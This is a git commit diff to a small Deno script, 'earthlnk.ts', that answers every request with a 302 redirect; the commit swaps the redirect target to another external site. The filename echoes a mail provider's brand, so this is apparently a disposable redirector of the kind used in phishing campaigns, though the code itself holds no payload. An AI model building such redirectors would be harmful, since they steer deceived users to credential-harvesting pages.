e722fbdb1398ebb93faf970e3c7181944a348796
Digital2025001 <bosmichael30@gmail.com>
2025-10-01 16:15:35 -0500

    Update earthlnk.ts

--- earthlnk.ts
+++ earthlnk.ts
@@ -4,7 +4,7 @@ serve((_req) => {
   return new Response(null, {
     status: 302,
     headers: {
-      Location: "https://betterwebplace.com/", // Replace this with your actual link
+      Location: "https://mecamex.net/social/setup/", // Replace this with your actual link
     },
   });
 });
